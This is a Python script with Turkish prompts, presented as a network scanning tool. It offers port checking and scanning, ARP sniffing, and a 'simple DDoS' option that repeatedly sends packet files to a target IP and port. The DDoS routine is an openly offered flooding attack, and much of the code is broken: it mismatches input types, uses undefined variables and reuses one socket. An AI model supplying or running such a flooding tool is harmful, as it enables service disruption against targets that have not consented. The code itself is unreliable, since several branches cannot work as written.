import socket
from pyfiglet import Figlet
import subprocess
import time
import os 
import nmap

from scapy.all import ARP, Ether, sniff


#Pyfiglet kurulum ASCII yazı
f = Figlet(font="slant")
#Socket kurma
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print(f.renderText("Komutan Logar"))
print(f.renderText("Ag Guvenlik Tarama Toolu"))
islem = int(input("Port Checker: 1, Port Finder: 2, Basit DDoS: 3, Not alma: 4, Cihazlar: 5, Çıkış: 0 "))

#nmap
#nm = nmap.PortScanner()

if islem == 1:
    while True:
     ip = input("Karşı IP'yi giriniz.")
     port = input("Karşı Port'u giriniz.")
     try:
        s.connect((ip, port))
        print("(E) Port aktif " + port)
     except:
        print("(H) Port deaktif " + port)
if islem == 2:
    while True:
        ip = input("Karşı IP'yi giriniz.")
        for port in range(1, 9999 + 1):
            try:
                s.connect((ip, port))
                print("(Y) Port aktif" + str(port))
                f = open("openport.txt", "x")
                f.write(port)
            except:
                print("(H) Port deaktif " + str(port))
if islem == 3:
	print(f.renderText("DDoS"))
	ddosIP = input("Paket Gönderilecek IP'yi giriniz.")
	ddosPort = input("Paket Gönderilecek Port'u giriniz.")
	paketbuyukluk = input("Gönderilecek paketlerin büyüklüğünü giriniz. (1, 2, 3)")
	if paketbuyukluk == 1:
		s.connect(ip, port)
		for paket in range(1, 500 + 1):
			try:
				f = open("paket1.txt")
				s.send(open("paket1.txt", "rb").read())
				print("Paket gönderildi!", paket)
			except:
				print("Paket gönderilemedi", paket)
	if paketbuyukluk == 2:
		s.connect(ip, port)
		for paket in range(1, 500 + 1):
			try:
			    f = open("paket2.txt")
			    soket.send(open("paket2.txt", "rb").read())
			    print("Paket gönderildi!", paket)
			except:
				print("Paket gönderilemedi", paket)
	if paketbuyukluk == 3:
		s.connect(ip, port)
		for paket in range(1, 500 + 1):
			try:
				f = open("paket3.txt")
				soket.send(open("paket3.txt", "rb").read())
				print("Paket gönderildi!", paket)
			except:
				print("Paket gönderilemedi", paket)

if islem == 4:
	print("Yakında gelecek")

if islem == 5:
    def scan_network():
        from scapy.all import ARP, Ether, sniff

        def process_packet(pkt):
            if pkt[ARP].op == 1:  # Sadece ARP isteklerini izleyin
                ip = pkt[ARP].psrc
                mac = pkt[ARP].hwsrc
                print(f"IP: {ip} - MAC: {mac}")

        sniff(prn=process_packet, filter="arp", store=0)

    scan_network()


if islem == 0:
	exit()
